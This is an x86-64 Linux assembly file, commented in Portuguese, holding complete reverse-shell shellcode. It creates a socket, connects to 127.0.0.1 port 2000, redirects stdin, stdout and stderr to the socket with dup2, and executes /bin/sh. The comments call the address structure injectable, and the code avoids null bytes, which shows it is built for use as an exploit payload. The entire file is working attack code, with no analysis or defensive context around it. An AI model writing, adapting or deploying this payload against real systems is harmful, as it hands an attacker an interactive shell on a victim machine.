[BITS 64]

global _start
section .text

_start:
    ; ============================================
    ; 1. socket(AF_INET, SOCK_STREAM, 0)
    ; Syscall número: 41 (0x29)
    ; ============================================
    xor rax, rax            ; Limpa RAX
    mov al, 41              ; Carrega identificador __NR_socket
    
    xor rdi, rdi            ; Limpa RDI
    mov dil, 2              ; RDI = AF_INET (2)
    
    xor rsi, rsi            ; Limpa RSI
    mov sil, 1              ; RSI = SOCK_STREAM (1)
    
    xor rdx, rdx            ; RDX = Protocolo (0)
    syscall                 ; Invoca o Kernel. Retorno (sockfd) armazenado em RAX.
    
    ; ============================================
    ; Preservação do Descritor do Socket
    ; ============================================
    mov rdi, rax            ; RDI assume o sockfd (arg1 para chamadas posteriores)
    
    ; ============================================
    ; 2. Construção Injetável da struct sockaddr_in
    ; Configuração: 127.0.0.1:2000
    ; ============================================
    xor rax, rax            ; Limpa RAX
    push rax                ; Empilha 8 bytes nulos para preencher o campo sin_zero
    push rax                ; Empilha mais 8 bytes. Pilha estendida temporariamente.
    
    ; Ajustamos e escrevemos linearmente nos offsets exatos a partir do ponteiro RSP
    mov dword [rsp+4], 0x0100007f   ; offset 4-7: sin_addr (IP: 127.0.0.1)
    mov word  [rsp+2], 0xd007       ; offset 2-3: sin_port (Porta: 2000)
    mov word  [rsp], 0x0002         ; offset 0-1: sin_family (AF_INET = 2)
    
    ; ============================================
    ; 3. connect(sockfd, &sockaddr_in, 16)
    ; Syscall número: 42 (0x2A)
    ; ============================================
    mov rsi, rsp            ; RSI (arg2) aponta para o endereço da estrutura na pilha
    xor rdx, rdx            ; Limpa RDX
    mov dl, 16              ; RDX (arg3) = sizeof(sockaddr_in) = 16 bytes
    
    xor rax, rax            ; Limpa RAX
    mov al, 42              ; Carrega identificador __NR_connect
    syscall                 ; Invoca connect
    
    ; ============================================
    ; 4. Redirecionamento de Fluxo via dup2()
    ; Syscall número: 33 (0x21)
    ; ============================================
    ; dup2(sockfd, 0) - Redireciona STDIN
    xor rax, rax            ; Limpa RAX
    mov al, 33              ; Carrega identificador __NR_dup2
    xor rsi, rsi            ; RSI (arg2) = 0 (stdin)
    syscall
    
    ; dup2(sockfd, 1) - Redireciona STDOUT
    xor rax, rax            ; Limpa RAX
    mov al, 33              ; Carrega identificador __NR_dup2
    xor rsi, rsi
    inc rsi                 ; RSI (arg2) = 1 (stdout)
    syscall
    
    ; dup2(sockfd, 2) - Redireciona STDERR
    xor rax, rax            ; Limpa RAX
    mov al, 33              ; Carrega identificador __NR_dup2
    xor rsi, rsi
    add rsi, 2              ; RSI (arg2) = 2 (stderr)
    syscall
    
    ; ============================================
    ; 5. execve("//bin/sh", NULL, NULL)
    ; Syscall número: 59 (0x3B)
    ; ============================================
    xor rax, rax            ; Limpa RAX
    push rax                ; Insere o terminador nulo (\x00) da string na pilha
    
    mov rbx, '//bin/sh'     ; Carrega a constante imediata alinhada de 8 bytes
    push rbx                ; Empilha a string literal
    
    mov rdi, rsp            ; RDI (arg1) assume o ponteiro para a string "//bin/sh"
    xor rsi, rsi            ; RSI (arg2: argv) = NULL
    xor rdx, rdx            ; RDX (arg3: envp) = NULL
    
    mov al, 59              ; Carrega identificador __NR_execve
    syscall                 ; Transfere definitivamente o controle de execução ao Kernel
